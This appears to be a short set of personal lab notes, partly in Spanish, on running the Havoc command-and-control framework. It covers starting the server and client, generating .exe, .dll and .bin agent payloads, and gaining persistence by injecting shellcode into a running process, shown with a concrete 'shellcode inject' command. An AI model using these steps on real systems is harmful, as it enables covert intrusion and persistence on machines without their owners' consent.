# Quick Start: Havoc Server and Client

## Starting the Server
1. Navigate to the Havoc directory:
    ```bash
    cd Havoc
    ```
2. Start the server:
    ```bash
    ./havoc server -d
    ```
- `-d` for default profile

## Launching the Client
1. Navigate to the Havoc directory:
    ```bash
    cd Havoc
    ```
2. Launch the client:
    ```bash
    ./havoc client
    ```
## Creación de agentes
- Attack => Payload => Hay que elegir el tipo de payload que queremos
    - .exe
    - .dll
    - .bin

### Persistencia inyectando shellcode dentro de un proceso
- Para ver los procesos activos dale a file explorer => process list
- Para armar el payload vamos a Attack => Payload => Windows Shellcode
- `shellcode inject x64 2668 /home/kali/Desktop/boxes/flight/inject.bin`